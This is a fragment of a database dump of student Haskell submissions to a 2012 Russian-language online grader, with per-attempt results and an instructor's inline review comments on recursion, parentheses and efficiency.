(237, 24, '4169333', '2012-09-09 14:58:01', 1, 'b n= bb n 0\r\nbb 0 s=s\r\nbb n s=s+1/(bb(n-1)(s+1))\r\n', '<br/>Тесты успешно пройдены!'),
(238, 19, '4169333', '2012-09-09 15:12:01', 0, 'b n= bb n 0 0\r\nbb 0 s m=(sin s)/m\r\nbb n s m=bb(n-1)(s+n)(m+(sin n))', 'Не удалось вычислить выражение "sumsin 1", проверьте правильность синтаксиса'),
(239, 19, '4169333', '2012-09-09 15:13:39', 1, 'sumsin n= bb n 0 0\r\nbb 0 s m=(sin s)/m\r\nbb n s m=bb(n-1)(s+n)(m+(sin n))', '<br/>Тесты успешно пройдены!'),
(240, 23, '517309', '2012-09-09 17:24:07', 3, 'c x = 6', 'Выражение имеет неправильное значение: c 10'),
(241, 18, 'hasp', '2012-09-09 20:28:46', 1, 'f n = if n == 0 then 1 else 1 + 1/(f (n-1))', '<br/>Тесты успешно пройдены!'),
(242, 24, 'hasp', '2012-09-09 20:38:18', 1, 'b n = 1/(foldr (x y-> 1/y + x) n [1..(n-1)])', '<br/>Тесты успешно пройдены!'),
(243, 19, 'hasp', '2012-09-09 20:41:20', 1, 'sumsin n = (sin (sum [1..n]))/( sum(map (sin) [1..n]) )', '<br/>Тесты успешно пройдены!'),
(244, 20, 'hasp', '2012-09-09 20:51:19', 0, 'sumfact n = fst (foldl (acc h -> let s = h*(snd acc) in ((fst acc) + s, s)  ) (1,1) [2..n', 'Не удалось вычислить выражение "sumfact 1", проверьте правильность синтаксиса'),
(245, 20, 'hasp', '2012-09-09 20:51:59', 1, 'sumfact n = fst (foldl (acc h -> let s = h*(snd acc) in ((fst acc) + s, s)  ) (1,1) [2..n])', '<br/>Тесты успешно пройдены!'),
(246, 22, 'hasp', '2012-09-09 21:14:45', 1, 'g t = let primes = (let s (x:xs) = x : s [p | p <- xs, p `mod` x > 0]; s [] = [] in s [2..t] ) in let s []=False; s (x:xs) = (elem (t-x) xs)||(s xs) in s primes', '<br/>Тесты успешно пройдены!'),
(247, 24, 'erwert', '2012-09-10 00:28:59', 2, 'test', 'Не удалось вычислить выражение "b 3", проверьте правильность синтаксиса'),
(248, 24, 'erwert', '2012-09-10 10:08:50', 1, 'b n = bb n 0\r\nbb 0 q = q\r\nbb n q = q + 1 / bb (n - 1)  (q+1)', '<br/>Тесты успешно пройдены!'),
(249, 19, 'erwert', '2012-09-10 10:10:08', 1, 'sumsin n = sumsinn n 0 0\r\nsumsinn 0 ss sn = sin ss / sn\r\nsumsinn n ss sn = sumsinn (n-1) (ss+n) (sn + sin(n))', '<br/>Тесты успешно пройдены!'),
(250, 20, 'erwert', '2012-09-10 10:10:53', 1, 'sumfact n = sumfactt n 1 1 0 \r\nsumfactt 1 i tfact r = r + tfact\r\nsumfactt n i tfact result = sumfactt (n-1) (i+1) (tfact*(i+1)) (result + tfact) \r\n', '<br/>Тесты успешно пройдены!'),
(251, 23, 'erwert', '2012-09-10 10:11:36', 2, 'q p a = if p*p <= a then if (mod a p == 0) && (p /= 1) then -1 else q (p+1) a else 1\r\ng n = gg 2 n \r\ngg i n = if i < div n 2 + mod n 2 then if (q 1 i == 1) && (q 1 (n - i) == 1) then True else gg (i+1) n else False', 'Не удалось вычислить выражение "c 10", проверьте правильность синтаксиса'),
(252, 22, 'erwert', '2012-09-10 10:11:45', 1, 'q p a = if p*p <= a then if (mod a p == 0) && (p /= 1) then -1 else q (p+1) a else 1\r\n  --- мне кажется, тут логичнее возвращать True или False\r\ng n = gg 2 n \r\ngg i n = if i < div n 2 + mod n 2 then if (q 1 i == 1) && (q 1 (n - i) == 1) then True else gg (i+1) n else False', '<br/>Тесты успешно пройдены!'),
(253, 21, '1384577', '2012-09-10 10:45:17', 1, 'p(i,0) | i==0 = 1\r\n       | otherwise = 0\r\n\r\np(n,k) = p(n,k-1)+p(n-k,k-1)\r\n  --- Скобки и запятые после p в Хаскеле не нужны...\r\n\r\nnseq n = p(n,n)', '<br/>Тесты успешно пройдены!'),
(254, 21, '2118411', '2012-09-10 13:14:39', 1, 'nseq n = f2 0 1 n\r\nf2 s l n | l+s==n = 1\r\n         | l+s<n = (f2 (s+l) (l+1) n) + (f2 s (l+1) n)\r\n         | otherwise = 0', '<br/>Тесты успешно пройдены!'),
(255, 18, '97440347', '2012-09-10 17:39:27', 0, 'chain 0 = 1\r\n\r\nchain n = 1+1/(chain (n-1))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(256, 18, '97440347', '2012-09-10 17:39:53', 0, 'chain 0 = 1\r\nchain n = 1+1/(chain (n-1))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(257, 18, '97440347', '2012-09-10 17:40:15', 2, 'c 0 = 1\r\n\r\nc n = 1+1/(c (n-1))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(258, 19, '63706456', '2012-09-10 17:46:04', 0, 'sumfact n = accfact 1 n 1 0\r\n\r\naccfact a b fc sm \r\n	| a > b = sm\r\n	| otherwise = let newFc = fc * a in\r\n		accfact (a+1) b newFc (sm + newFc)\r\n', 'Не удалось вычислить выражение "sumsin 1", проверьте правильность синтаксиса'),
(259, 20, '63706456', '2012-09-10 17:46:20', 1, 'sumfact n = accfact 1 n 1 0\r\n\r\naccfact a b fc sm \r\n	| a > b = sm\r\n	| otherwise = let newFc = fc * a in\r\n		accfact (a+1) b newFc (sm + newFc)\r\n', '<br/>Тесты успешно пройдены!'),
(260, 19, '63706456', '2012-09-10 17:47:01', 0, 'sumsin n = accsin 0 0 n\r\n\r\naccsin a b 0 = (sin a) / b\r\naccsin a b n = accsin (a + n) (b + sin n) n-1', 'Не удалось вычислить выражение "sumsin 1", проверьте правильность синтаксиса'),
(261, 21, 'hasp', '2012-09-10 18:26:47', 1, 'nseqI n cur (x:xs)| cur == n = 1 + (nseqI n 0 (x:xs))  \r\n			      | cur > n = (nseqI n 0 xs) + (nseqI n x xs)\r\n				  | otherwise = (nseqI n cur xs) + (nseqI n (cur+x) xs) \r\nnseqI n cur [] = if cur == n then 1 else 0\r\nnseq 0 = 0\r\nnseq n = 1+(nseqI n 0 [1..n-1])\r\n ', '<br/>Тесты успешно пройдены!'),
(262, 19, '63706456', '2012-09-10 19:03:45', 1, 'sumsin n = accsin 0 0 n\r\n\r\naccsin a b 0 = (sin a) / b\r\naccsin a b n = accsin (a + n) (b + sin n) (n-1)', '<br/>Тесты успешно пройдены!'),
(263, 18, '374969', '2012-09-10 19:14:45', 1, 'f :: Float -> Float\r\n  --- тип можно не писать\r\nf 0.0 = 1.0\r\nf n = 1.0 + 1.0 / (f (n - 1.0))\r\n', '<br/>Тесты успешно пройдены!'),
(264, 23, 'hasp', '2012-09-10 19:40:59', 1, 'divisors n = n:[p | p <-[2..n `div` 2], n `mod` p == 0]\r\nnseqI n cur (x:xs)| cur == n = 1 + (nseqI n 0 [x..n-1])  \r\n			      | cur > n = (nseqI n 0 [x..n-1]) + (nseqI n x (let d = divisors x in filter (	 ->(filter (g->t `mod` g == 0) d) == []) [x..n-1]) )\r\n				  | otherwise = (nseqI n cur xs) + (nseqI n (cur+x) (let d = divisors x in filter (	 ->(filter (g->t `mod` g == 0) d) == []) xs) ) \r\nnseqI n cur [] = if cur == n then 1 else 0\r\nc 0 = 0\r\nc n = 1+(nseqI n 1 [2..n-1])+(nseqI n 0 [2..n-1])\r\n   --- Я бы в этой задаче использовал алгоритм Евклида (чтобы проверять, что числа взаимно простые)\r\n', '<br/>Тесты успешно пройдены!'),
(265, 24, '374969', '2012-09-10 20:04:49', 1, 'bh :: Int -> Int -> Float\r\nbh cur max = if (cur == max) then fromInteger (toInteger cur) else fromInteger (toInteger cur) + 1.0 / (bh (cur + 1) max)\r\n\r\nb :: Int -> Float\r\nb n = bh 0 n', '<br/>Тесты успешно пройдены!'),
(266, 22, 'dandelio', '2012-09-10 20:10:28', 2, 'test', 'Не удалось вычислить выражение "g 6", проверьте правильность синтаксиса'),
(267, 18, '6774563', '2012-09-10 21:26:35', 1, 'f :: Integer -> Double\r\nf 0 = 1\r\nf n | n > 0 = 1 + 1 / f(n - 1)\r\n', '<br/>Тесты успешно пройдены!'),
(268, 24, '6774563', '2012-09-10 21:57:43', 1, 'b 0 = 0\r\nb n | n > 0 = bImpl 0 where\r\n	bImpl i | i < n = fromIntegral i + 1 / bImpl(i + 1)\r\n	bImpl n = fromIntegral n\r\n', '<br/>Тесты успешно пройдены!'),
(269, 19, '6774563', '2012-09-10 22:07:06', 1, 'sumsin 0 = 0 --not to divide by zero\r\nsumsin n = sin(sumTill n) / sumSinTill(n)\r\n   --- Можно писать sumSinTill n, тут скобки не нужны\r\n\r\nsumTill 0 = 0\r\nsumTill n | n>0 = n + sumTill(n - 1)\r\n\r\nsumSinTill 0 = 0\r\nsumSinTill n | n>0 = sin(n) + sumSinTill(n - 1)\r\n   --- OK, засчитано, но только это не хвостовая рекурсия...\r\n   --- И тут можно писать просто sin n, в этом месте скобки не нужны.', '<br/>Тесты успешно пройдены!'),
(270, 20, '6774563', '2012-09-10 22:11:56', 0, 'sumfact 0 = 0\r\nsumfact n | n>0 = fact(n) + sumfact(n-1)\r\n\r\nfact 0 = 1\r\nfact n | n>0 = n*fact(n-1)\r\n', '<br/>Тесты успешно пройдены!'),
(271, 20, '6774563', '2012-09-10 22:33:53', 1, '--more cool way (with accumulator)\r\nsumfact 0 = 0\r\nsumfact n | n>0 = sumfactAcc 1 1 where\r\n	sumfactAcc i factVal | i<n = factVal + sumfactAcc (i + 1) (factVal * (i+1))\r\n	sumfactAcc n factVal = factVal\r\n', '<br/>Тесты успешно пройдены!'),
(272, 21, '6774563', '2012-09-11 09:18:41', 1, '--it can be done with dynamic programming mush faster, I will probally submit it later\r\n  --- Очень хорошее замечание! К сожалению, для динамического програмирования Хаскел не очень подходит,\r\n  --- прощев всего наверное было бы применить массивы Хаскела (которые мы не проходили, и, скорее всего\r\n  -- и не пройдем). Но и со списками, конечно, тоже можно как=то это написать..\r\nnseq 0 = 0\r\nnseq n | n>0 = nseqImpl n n\r\n\r\n--iterating last number in sequence (it is local maximum)\r\nnseqImpl n m | m > n = nseqImpl n n\r\nnseqImpl n m | n<=0 = 1 \r\nnseqImpl n 0 | n>0  = 0\r\nnseqImpl 1 m | m>=1 = 1\r\nnseqImpl n cur | cur>0 = nseqImpl (n-cur) (cur-1) + nseqImpl n (cur-1)\r\n', '<br/>Тесты успешно пройдены!'),
(273, 22, '6774563', '2012-09-11 14:03:46', 1, 'g n = gImpl 2 (n-2)\r\n\r\ngImpl a b | b <= a = False\r\ngImpl a b = isPrime a && isPrime b || gImpl (a+1) (b-1)\r\n\r\nisPrime 0 = False\r\nisPrime 1 = False\r\nisPrime 2 = True\r\nisPrime n | n>2 = cannotBeDividedTill(truncate(sqrt(fromIntegral n))  + 1) where\r\n	cannotBeDividedTill 1 = True\r\n	cannotBeDividedTill m = n `mod` m /= 0 && cannotBeDividedTill (m-1)\r\n', '<br/>Тесты успешно пройдены!'),
(274, 20, '4169333', '2012-09-11 15:25:07', 1, 'sumfact n= bb n 1 1\r\nbb n a k\r\n	|k<n=a*k+bb(n)(a*k)(k+1)\r\n  --- скобки около n не нужны..\r\n	|k==n=a*n', '<br/>Тесты успешно пройдены!'),
(275, 18, '472848', '2012-09-11 16:10:46', 2, 'f 1 = 2\r\nf x = 1 + 1 / f (x - 1)', '<br/>Тесты успешно пройдены!'),
(276, 24, '472848', '2012-09-11 16:11:47', 1, 'f 1 n = n - 1 + (1 / n) \r\nf i n = (n - i) + 1 / (f (i - 1) n)\r\n   --- или можно ... = n - i + 1 / f (i - 1) n \r\nb 0 = 0\r\nb n = f n n', '<br/>Тесты успешно пройдены!'),
(277, 19, '472848', '2012-09-11 16:12:19', 1, 'sumn 0 = 0\r\nsumn n = sumn (n - 1) + n\r\nsin_sum 0 = 0\r\nsin_sum n = sin_sum (n - 1) + sin n\r\nsumsin n = (sin (sumn n)) / (sin_sum n)\r\n   --- OK, зачтено, но это не хвостовая рекурсия..', '<br/>Тесты успешно пройдены!'),
(278, 20, '472848', '2012-09-11 16:12:41', 0, 'fact 0 = 1\r\nfact 1 = 1\r\nfact n = n * fact(n - 1)\r\nsumfact 0 = 0\r\nsumfact 1 = 1\r\nsumfact n = sumfact (n - 1) + fact n', '<br/>Тесты успешно пройдены!'),
(279, 20, '3431532', '2012-09-11 16:12:50', 1, 'sumfact x = factsum 1 1 x\r\n\r\n\r\nfactsum y x z | x==z = y*x\r\nfactsum y x z = (factsum (y*x) (x+1)  z) + y*x\r\nfactsum 1 1 x = 1', '<br/>Тесты успешно пройдены!'),
(280, 19, '3431532', '2012-09-11 16:19:58', 1, 'sumsin x = factsum 0 0 1 x\r\n\r\n\r\nfactsum x y u z | u==z+1 = sin(x)/y\r\nfactsum x y u z = factsum (x+u) (y+sin(u)) (u+1) z\r\n   -- скобки после sin всюду можно не писать', '<br/>Тесты успешно пройдены!'),
(281, 20, '472848', '2012-09-11 16:21:10', 1, 'f k 1 n = k\r\nf k m n = k + f (k * (n - m + 2)) (m - 1) n \r\nsumfact n = f 1 n n', '<br/>Тесты успешно пройдены!'),
(282, 23, '6774563', '2012-09-11 16:43:15', 2, 'c n = gener n n []\r\n\r\ngener n max list | max>n = gener n n list\r\ngener n max list | n<1   = boolToInt (verify list)\r\ngener n 0   list         = 0\r\ngener 1 max list | max>0 = boolToInt (verify (1:list))\r\ngener n max list | max>0 = gener (n-max) (max-1) (max:list) + gener n (max-1) list\r\n\r\nverify [] = True\r\nverify [h] = True\r\nverify (h1:h2:t) = areCoprime h1 h2 && verify (h1:t) && verify (h2:t)\r\n  --- вообще у вас решение правильно, но в этом месте вы написали очень, очень неэффективно.\r\n  --- поскольку у вас функция вызывает себя рекурсивно два раза, то список длины n потребует 2^n\r\n  --- операций, понятно ведь, да? \r\n  --- А на самом деле, конечно, надо n*n операций, просто сравнить каждый с каждым.\r\n  --- В результате даже для n = 70 или 80 у вас функция работает очень долго, хотя ответ и не очень большой.\r\n  --- Попробуйте исправить, пожалуйста. Если что-то непонятно, или если вы не согласны, пишите, обсудим. \r\n\r\nareCoprime a b = (myGcd a b) == 1\r\n\r\n--myGcd (not gcd) because of the name ambiguity with some std function\r\n   --- Да, есть такая функция, она, понятно, как раз ищет gcd :) В принципе вы могли ей  воспользоваться.\r\nmyGcd 0 b = b\r\nmyGcd a 0 = a\r\nmyGcd a b | b>a = myGcd b a\r\nmyGcd a b = myGcd (a `mod` b) b\r\n\r\n--can I avoid it?\r\nboolToInt True = 1\r\nboolToInt False = 0\r\n   --- Вы имеете в виду есть ли автоматическое преобразование Bool в Int? Нет, нету.. Или был какой-то другой вопрос?', '<br/>Тесты успешно пройдены!'),
(283, 18, '3431532', '2012-09-11 16:53:07', 1, 'f x = ff x\r\n\r\nff 1 = 2\r\nff x = 1 + 1/(ff (x-1))', '<br/>Тесты успешно пройдены!'),
(284, 24, '3431532', '2012-09-11 16:58:11', 1, 'b x = ff 0 x\r\n\r\nff x y | x==y-1 = x + 1/y \r\nff x y = x + 1/(ff (x+1) y)', '<br/>Тесты успешно пройдены!'),
(285, 23, '6774563', '2012-09-11 17:29:36', 1, 'c n = gener n n []\r\n\r\ngener n max list | max>n = gener n n list\r\ngener n max list | n<1   = boolToInt (verify list)\r\ngener n 0   list         = 0\r\ngener 1 max list | max>0 = boolToInt (verify (1:list))\r\ngener n max list | max>0 = gener (n-max) (max-1) (max:list) + gener n (max-1) list\r\n\r\nverify [] = True\r\nverify [h] = True\r\nverify (h:t) = all (x -> areCoprime h x) t && verify t\r\n  --- Да, что-то переклинило меня немного. Не знал про существование all, map и т.д.,\r\n  --- поэтому решил заняться творчесвом. Спасибо!\r\n    --- ### OK, очень хорошо! Немного забегая вперед, кстати, это короче можно написать\r\n    ---    verify (h:t) = all (areCoprime h) t && verify t  \r\n\r\nareCoprime a b = (myGcd a b) == 1\r\n\r\n--myGcd (not gcd) because of the name ambiguity with some std function\r\n   --- Да, есть такая функция, она, понятно, как раз ищет gcd :) В принципе вы могли ей  воспользоваться.\r\n\r\n   --- Так неитересно :) Хотелось ощутить всю мощь функциональной стороны силы, для gcd она как раз идельна\r\nmyGcd 0 b = b\r\nmyGcd a 0 = a\r\nmyGcd a b | b>a = myGcd b a\r\nmyGcd a b = myGcd (a `mod` b) b\r\n\r\nboolToInt True = 1 \r\nboolToInt False = 0', '<br/>Тесты успешно пройдены!'),
(286, 21, 'erwert', '2012-09-11 17:36:56', 1, 'nseq n = nq 0 n 0\r\nnq m o count = if m < o then nq2 (m+1) o count else 0\r\nnq2 m o c = if m < o then nq m (o - m) (c + 1)  + nq2 (m + 1) o c else 1', '<br/>Тесты успешно пройдены!'),
(287, 18, 'tonyo', '2012-09-11 17:42:35', 1, 'f 0 = 1 \r\nf n = 1 + 1/(f (n-1))\r\n   --- Можно немного короче f n = 1 + 1/f (n-1)', '<br/>Тесты успешно пройдены!'),
(288, 24, 'tonyo', '2012-09-11 17:52:25', 1, 'b1 m 0 = m\r\nb1 m n = m + 1/(b1 (m+1) (n-1))\r\n   --- и тут тоже скобки лишние  \r\nb n = b1 0 n\r\n', '<br/>Тесты успешно пройдены!'),
(289, 20, 'tonyo', '2012-09-11 18:31:18', 1, 'sumfact1 start end fact res =   if start == end\r\n                                then res+fact\r\n                                else sumfact1 (start+1) end (fact*(start+1)) (res+fact)\r\n\r\nsumfact n = sumfact1 1 n 1 0 ', '<br/>Тесты успешно пройдены!'),
(290, 18, '472848', '2012-09-11 18:39:14', 1, 'f 0 = 1\r\nf x = 1 + 1 / f (x - 1)', '<br/>Тесты успешно пройдены!'),
(291, 19, 'tonyo', '2012-09-11 19:03:26', 1, 'sumsin1 0 numsum denom = (sin numsum)/denom\r\nsumsin1 n numsum denom = sumsin1 (n-1) (numsum+n) (denom+sin n)\r\n\r\nsumsin n = sumsin1 n 0 0\r\n', '<br/>Тесты успешно пройдены!'),
(292, 21, 'tonyo', '2012-09-11 20:36:58', 1, 'nseq1 min n res \r\n    | min > n = res \r\n    | min == n = res+1\r\n    | otherwise =  nseq1 (min+1) n res \r\n                   + nseq1 (min+1) (n-min) res \r\n\r\nnseq n = nseq1 1 n 0 ', '<br/>Тесты успешно пройдены!'),
(293, 23, 'erwert', '2012-09-11 22:52:26', 2, 'c n = ns 0 n 1\r\nns m o count = if m < o then ns2 (m+1) o count else 0\r\nns2 m o count = if m < o then (if nod (o - m) m == 1 then ns m (o - m) (count + 1) + ns2 (m + 1) o count else ns2 (m + 1) o count) else 1\r\nnod a 0 = a\r\nnod a b = nod b (mod a b)\r\n   --- Не совсем правильно.. Например, c 9 у вас возвращает 6, а на самом деле д.б. 5\r\n   --- Такого теста у меня не было, но сейчас я его добавил. Попробуйте исправить, пожалуйста.', '<br/>Тесты успешно пройдены!'),
(294, 18, '442421', '2012-09-12 07:22:37', 1, 'f 0 = 1 \r\nf x = 1 + 1 / f (x - 1)\r\n', '<br/>Тесты успешно пройдены!'),
(295, 24, '442421', '2012-09-12 08:00:23', 1, 'b x = r x x\r\nr x 0 = x\r\nr x i = r (i-1+1/x) (i-1)', '<br/>Тесты успешно пройдены!'),
(296, 19, '442421', '2012-09-12 08:12:54', 1, 'sumsin n = sin (n*(n+1)/2) / sinsum n\r\nsinsum n = sinsum1 n 0\r\nsinsum1 0 x = x\r\nsinsum1 n x = sinsum1 (n-1) (x+sin n)', '<br/>Тесты успешно пройдены!'),
(297, 20, '442421', '2012-09-12 08:28:27', 1, 'sumfact n = sumfact1 n 1 1 0\r\nsumfact1 0 n p r = r\r\nsumfact1 n i p r = sumfact1 (n-1) (i+1) (p*(i+1)) (r+p)\r\n ', '<br/>Тесты успешно пройдены!'),
(298, 18, '83813', '2012-09-12 10:02:46', 0, 'f x = if x <= 0\n\n        then 1\n\n        else 1 + 1 / (f (x - 1))\n\n\n', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(299, 18, '83813', '2012-09-12 10:05:45', 1, 'f x = if x <= 0\r\n        then 1\r\n        else 1 + 1 / (f (x - 1))\r\n  --- или можно 1 + 1 / f (x - 1)', '<br/>Тесты успешно пройдены!'),
(300, 24, '83813', '2012-09-12 10:08:40', 1, 'f x y = if x <= 0\r\n        then y\r\n        else y + 1 / (f (x - 1) (y + 1))\r\n  --- или y + 1 / f (x - 1) (y + 1)\r\nb x = f x 0', '<br/>Тесты успешно пройдены!'),
(301, 19, '83813', '2012-09-12 10:13:25', 1, 'sumsin n = sin (sum [1..n]) / sum [sin x | x <- [1..n]]\r\n', '<br/>Тесты успешно пройдены!'),
(302, 20, '83813', '2012-09-12 10:15:11', 1, 'sumfact n = sum [product [1..x] | x <- [1..n]]', '<br/>Тесты успешно пройдены!'),
(303, 21, '83813', '2012-09-12 10:23:34', 1, 'nseqInt s mx = if (s <= 0)\r\n                 then max 0 (s + 1)\r\n                 else sum [nseqInt (s-x) x | x<-[1..(mx - 1)]]\r\nnseq n = nseqInt n (n + 1)', '<br/>Тесты успешно пройдены!'),
(304, 22, '83813', '2012-09-12 10:33:49', 1, 'prime n = (n > 1) && null [x | x<-[2..(n - 1)], (n `mod` x) == 0]\r\n   --- OK, но тут, конечно достаточно проверять до n/2 а tit лучше до sqrt n\r\ng n = not (null [x | x<-[1..n], prime x, prime (n - x), x /= (n - x)])\r\n   --- и тут тоже до n/2, кстати, тогда и не надо будет проверять последнее условие\r\n', '<br/>Тесты успешно пройдены!'),
(305, 18, '383483', '2012-09-12 12:09:19', 0, 'nsum n = nsum1 n 1\r\nnsum1 0 p = p \r\nnsum1 n p = nsum1 (n-1) (1+1/p)', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(306, 18, '383483', '2012-09-12 12:11:43', 1, 'f n = nsum1 n 1\r\nnsum1 0 p = p \r\nnsum1 n p = nsum1 (n-1) (1+1/p)', '<br/>Тесты успешно пройдены!'),
(307, 22, '787463', '2012-09-12 12:12:55', 1, 'isPrime 1 = False\r\nisPrime 2 = True\r\nisPrime n = isPrime1 n 2\r\n\r\nisPrime1 n k\r\n  | k == n - 1 = True\r\n  | mod n k /= 0 = isPrime1 n (k + 1)\r\n  | otherwise = False\r\n\r\ng n = g1 n 1\r\ng1 n k\r\n  | k /= n - k && isPrime k && isPrime (n - k) = True\r\n  | k == n = False\r\n  | otherwise = g1 n (k + 1)', '<br/>Тесты успешно пройдены!'),
(308, 23, '787463', '2012-09-12 12:19:09', 1, 'c n = c1 n n 1\r\nc1 n max prod\r\n  | n == 0 = 1\r\n  | max == 0 = 0\r\n  | n < max = c1 n n prod\r\n  | gcd max prod == 1 = c1 (n - max) (max - 1) (prod * max) + c1 n (max - 1) prod\r\n  | otherwise = c1 n (max - 1) prod', '<br/>Тесты успешно пройдены!'),
(309, 23, '517309', '2012-09-12 12:19:39', 2, 'c n = ns 0 n 1\r\nns m o count = if m < o then ns2 (m+1) o count else 0\r\nns2 m o count = if m < o then (if nod (o - m) m == 1 then ns m (o - m) (count + 1) + ns2 (m + 1) o count else ns2 (m + 1) o count) else 1\r\nnod a 0 = a\r\nnod a b = nod b (mod a b)', 'Выражение имеет неправильное значение: c 9'),
(310, 23, '517309', '2012-09-12 12:22:42', 3, 'c n = c1 n n 1\r\nc1 n max prod\r\n  | n == 0 = 1\r\n  | max == 0 = 0\r\n  | n < max = c1 n n prod\r\n  | gcd max prod == 1 = c1 (n - max) (max - 1) (prod * max) + c1 n (max - 1) prod\r\n  | otherwise = c1 n (max - 1) prod', '<br/>Тесты успешно пройдены!'),
(311, 24, '383483', '2012-09-12 12:23:09', 0, 'f n = nsum1 n n\r\nnsum1 0 p = p \r\nnsum1 n p = nsum1 (n-1) (n-1+1/p)', 'Не удалось вычислить выражение "b 3", проверьте правильность синтаксиса'),
(312, 24, '383483', '2012-09-12 12:23:29', 1, 'b n = nsum1 n n\r\nnsum1 0 p = p \r\nnsum1 n p = nsum1 (n-1) (n-1+1/p)', '<br/>Тесты успешно пройдены!'),
(313, 19, '383483', '2012-09-12 12:50:37', 1, 'sumsin n = f1 n 0 0 \r\nf1 0 s p = (sin s)/p \r\nf1 n s p = f1 (n-1) (s+n) (p+(sin n))', '<br/>Тесты успешно пройдены!'),
(314, 18, '985727', '2012-09-12 13:18:05', 1, 'f 0 = 1\r\nf 1 = 2\r\nf x = 1 + 1/f (x-1)', '<br/>Тесты успешно пройдены!'),
(315, 20, '383483', '2012-09-12 13:24:16', 1, 'sumfact n = f1 n 1 0 1 \r\nf1 0 f s i = s\r\nf1 n f s i = f1 (n-1) (f*i) (s+f*i) (i+1)', '<br/>Тесты успешно пройдены!'),
(316, 19, '985727', '2012-09-12 13:39:24', 1, 'sum1 n = n*(n + 1)/2\r\nsin1 n = sin (sum1 n)\r\nsum2 1 = sin 1\r\nsum2 n = sin n + sum2 (n-1)\r\nsumsin n = (sin1 n)/(sum2 n)\r\n   --- Засчитано, но эт не хвостовая рекурсия...', '<br/>Тесты успешно пройдены!'),
(317, 20, '985727', '2012-09-12 13:41:52', 1, 'fact 0 = 1\r\nfact n = n * fact(n-1)\r\nsumfact 1 = 1\r\nsumfact n = sumfact(n-1) + fact n\r\n  --- И тут не хвостовая рекурсия, ивообще не оченб эффективно, мы про это говорили..', '<br/>Тесты успешно пройдены!'),
(318, 24, '985727', '2012-09-12 14:23:31', 0, 'f x y z = if (y == z) then z \r\nelse x + 1/(f (x+1) (y+1) z)\r\nb n = f 0 1 n', 'Выражение имеет неправильное значение: b 3'),
(319, 24, '985727', '2012-09-12 14:26:54', 1, 'f x y z = if (y > z) then z \r\nelse x + 1/(f (x+1) (y+1) z)\r\n   --- одни скобки лишние, можно 1/f (x+1) (y+1) z\r\nb n = f 0 1 n', '<br/>Тесты успешно пройдены!'),
(320, 21, '383483', '2012-09-12 16:49:43', 1, 'nseq n = cycl 1 n 0\r\ncycl i n res\r\n   | i == n = res+1\r\n   | otherwise = cycl (i+1) n (res + mcycl n i)\r\nmcycl n x \r\n      | x > n = 0\r\n      | x == n = 1\r\n      | otherwise = bcycl (x+1) n (n-x) 0\r\nbcycl s n q t\r\n      | s>=n = t\r\n      | otherwise = bcycl (s+1) n q (t + mcycl q s) ', '<br/>Тесты успешно пройдены!'),
(321, 23, '1730564', '2012-09-12 18:01:58', 1, 'c :: Integer -> Integer\r\nc n = seq1 1 1 n\r\n\r\nseq1 :: Integer -> Integer -> Integer -> Integer\r\nseq1 m s n | n == 0 = 1\r\n		   | ((n - s) < 0 || n < 0) = 0		   \r\n		   | otherwise = if ((gcd m s) == 1) then seq1 (m * s) (s + 1) (n - s) + seq1 m (s + 1) n\r\n											 else seq1 m (s + 1) n											 										', '<br/>Тесты успешно пройдены!'),
(322, 18, 'sromanov', '2012-09-12 18:31:59', 1, 'f 1 = 2\r\nf n = 1 + 1/f (n-1)\r\n', '<br/>Тесты успешно пройдены!'),
(323, 21, '985727', '2012-09-12 19:19:16', 1, 'f 0 0 = 1\r\nf x 0 = 0\r\nf n k = f n (k-1) + f (n-k) (k-1)\r\nnseq x = f x x', '<br/>Тесты успешно пройдены!'),
(324, 18, '3742311', '2012-09-12 19:26:06', 0, 'f n = if n == 0 then 1 else (1 + 1/(f n-1))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(325, 18, '3742311', '2012-09-12 19:26:58', 0, 'let f n = if n == 0 then 1 else (1 + 1/(f n-1))', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(326, 23, '397095', '2012-09-12 19:28:17', 2, '  --- Могу подсказать, что ваше решение начинает давать неправильные ответы начиная с 11\r\nc n = loop 1 n 1 n 0 + 1\r\n\r\nis_pc a b = is_pc2 a b 1\r\nis_pc2 a b i\r\n | i > a = True\r\n | i > b = True\r\n | i /= 1 && mod a i == 0 && mod b i == 0 = False\r\n | otherwise = is_pc2 a b (i+1)\r\n\r\ncount d p m\r\n | d > m = 0\r\n | d == m = if is_pc d p then 1 else 0\r\n | otherwise = loop (d+1) m (d*p) (m-d) 0\r\n\r\nloop i u p m s\r\n | i == u = s\r\n | otherwise = loop (i+1) u p m (s + count i p m) ', 'Выражение имеет неправильное значение: c 20'),
(327, 18, '3742311', '2012-09-12 19:29:49', 1, 'f n = if n == 0 then 1 else (1 + 1/f(n-1))\r\n    --- последние скобки можно не писать: else 1 + 1/f(n-1)', '<br/>Тесты успешно пройдены!'),
(328, 20, '3742311', '2012-09-12 19:40:48', 1, 'sumfact n = if n == 0 then 0 else sumfact(n - 1) + product[1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(329, 18, '318210', '2012-09-12 19:41:56', 0, 'f :: Double -> Double\r\nf2 :: Double -> Double -> Double\r\nf 0 = 0\r\nf 1 = 1\r\nf n = f2 n 1\r\nf2 n k | n == 0 = k\r\n	| n > 0 = f2 (n - 1) (1 + 1/k)', 'Выражение имеет неправильное значение: f 1'),
(330, 18, '318210', '2012-09-12 19:46:19', 1, 'f :: Double -> Double\r\nf2 :: Double -> Double -> Double\r\nf 0 = 0\r\nf n = f2 n 1\r\nf2 n k | n == 0 = k\r\n	| n > 0 = f2 (n - 1) (1 + 1/k)', '<br/>Тесты успешно пройдены!'),
(331, 24, 'B@rmaley.exe', '2012-09-12 19:46:42', 1, 'b n = foldr (k acc -> 1 / (fromIntegral k + acc)) 0 [1..n]', '<br/>Тесты успешно пройдены!'),
(332, 19, 'B@rmaley.exe', '2012-09-12 19:47:21', 1, 'sumsin :: Int -> Double\r\nsumsin n = sin (sum a) / sum (map sin a)\r\n           where a = map fromIntegral [1..n]', '<br/>Тесты успешно пройдены!'),
